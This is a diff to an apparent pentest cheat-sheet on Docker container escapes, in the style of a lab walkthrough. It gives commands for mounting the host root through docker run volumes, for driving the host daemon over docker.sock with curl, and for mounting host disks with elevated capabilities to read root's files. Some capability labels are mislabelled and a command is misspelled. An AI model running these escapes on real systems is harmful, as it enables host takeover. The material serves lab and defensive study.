@@ -20,6 +20,12 @@ has_toc: false
 
 [Docker api reference](https://docs.docker.com/engine/api/v1.40/#)
 
+[Container escape](https://attackdefense.com/challengedetailsnoauth?cid=1196)
+
+[Container escape](https://attackdefense.com/challengedetailsnoauth?cid=1197)
+
+<br />
+
 ## Docker run
 See the [docker run cli reference](https://docs.docker.com/engine/reference/commandline/container_run/) for more details and a full list of options.
 
@@ -32,7 +38,14 @@ See the [docker run cli reference](https://docs.docker.com/engine/reference/comm
 |`--volume /:/mnt`|Mount the root of the host to `/mnt` within the container.|
 |`--volume /root:/mnt`|Mount root's home folder of the host to `/mnt/` within the container.|
 
-## Docker escapes using docker run
+<br />
+
+## Container Escapes
+*In general, you probably need to be `root` in container before trying to escape it.*  
+
+<br />
+
+### Docker run
 You'll need a `docker` binary in the container in order to use `docker run`. If you have a shell on the host system you can check if the host and the container are on the same network. If they are, you may be able to `wget` the docker binary from the host to the container.
 
 ```
@@ -52,7 +65,9 @@ docker run --rm --volume /:/mnt -it ubuntu chroot /mnt
 docker run --rm --volume /root:/mnt -it ubuntu
 ```
 
-## Docker socket
+<br />
+
+### Docker socket
 If there is a `docker.sock` socket in `/var/run/` of the container, you can communicate with the docker daemon on the host (see [this article](https://medium.com/better-programming/about-var-run-docker-sock-3bfd276e12fd) for more details). Most of the docker endpoints are mapped to commands, for example `GET http://localhost/containers/json` maps to `docker ps`. See the right-hand side of the [docker specification](https://docs.docker.com/engine/api/v1.40/#) page for details of the endpoints. For example:
 
 ```
@@ -70,4 +85,87 @@ curl -X POST --unix-socket /var/run/docker.sock -d '{"Image":"nginx"}' -H 'Conte
 
 // Start the container.
 curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/age65...g45/start
+```
+
+<br />
+
+### Container started with cap_sys_admin network admin capability
+*This needs `root` in the container first.*
+
+[See this video for walkthrough](https://attackdefense.com/challengedetailsnoauth?cid=1196)
+
+If the container has been started in privileged mode or with additional capabilities, it may be possible to mount the host file system and execute commands as root. First, check for the `cap_sys_admin` network admin privilege:
+```
+capsh --print | grep -i cap_sys_admin
+```
+
+If `cap_sys_admin` is present in the output, check what disks can be found:
+```
+fidsk -l
+```
+
+**Disk /dev/sda: 20GiB, 12474836480 bytes, 41943040 sectors**<br />
+Units: ...<br />
+<br />
+**Device&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Start&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;End&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sectors&nbsp;&nbsp;&nbsp;Size&nbsp;&nbsp;&nbsp;&nbsp;Type**<br />
+/dev/sda1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2048&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4095&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2048&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1M&nbsp;&nbsp;&nbsp;&nbsp;BIOS boot<br />
+/dev/sda2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;&nbsp;&nbsp;&nbsp;37746687&nbsp;&nbsp;&nbsp;&nbsp;37742592&nbsp;&nbsp;&nbsp;&nbsp;18G&nbsp;&nbsp;&nbsp;&nbsp;Linux filesystem<br />
+/dev/sda3&nbsp;&nbsp;&nbsp;&nbsp;37746688&nbsp;&nbsp;&nbsp;&nbsp;41940991&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4194304&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2G&nbsp;&nbsp;&nbsp;&nbsp;Linux swap<br />
+
+<br />
+
+From the output it's clear the host file system can be found on `/dev/sda2`. Mount the filesystem:
+```
+mkdir /tmp/m
+mount /dev/sda2 /tmp/m
+```
+
+Use `chroot` to change bash's `root` location to the mount point:
+```
+chroot /tmp/m bash
+```
+
+Cat the flag:
+```
+cd /root/
+cat root.txt
+```
+
+<br />
+
+### Container started with cap_net_admin network admin capability
+*This needs `root` in the container first.*
+
+[See this video for walkthrough](https://attackdefense.com/challengedetailsnoauth?cid=1197)
+
+If the container has been started in privileged mode or with additional capabilities, it may be possible to mount the host file system and execute commands as root. First, check for the `cap_net_admin` network admin privilege:
+```
+capsh --print | grep -i cap_net_admin
+```
+
+If `cap_net_admin` is present in the output, check what disks can be found:
+```
+fidsk -l
+```
+
+**Disk /dev/sda: 20GiB, 12474836480 bytes, 41943040 sectors**<br />
+Units: ...<br />
+<br />
+**Device&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Start&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;End&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sectors&nbsp;&nbsp;&nbsp;Size&nbsp;&nbsp;&nbsp;&nbsp;Type**<br />
+/dev/sda1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2048&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4095&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2048&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1M&nbsp;&nbsp;&nbsp;&nbsp;BIOS boot<br />
+/dev/sda2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;&nbsp;&nbsp;&nbsp;37746687&nbsp;&nbsp;&nbsp;&nbsp;37742592&nbsp;&nbsp;&nbsp;&nbsp;18G&nbsp;&nbsp;&nbsp;&nbsp;Linux filesystem<br />
+/dev/sda3&nbsp;&nbsp;&nbsp;&nbsp;37746688&nbsp;&nbsp;&nbsp;&nbsp;41940991&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4194304&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2G&nbsp;&nbsp;&nbsp;&nbsp;Linux swap<br />
+
+<br />
+
+From the output it's clear the host file system can be found on `/dev/sda2`. Mount the filesystem:
+```
+mkdir /tmp/m
+mount /dev/sda2 /tmp/m
+```
+
+You can now query the mounted file system:
+```
+cd /tmp/m/root
+cat root.txt
 ```
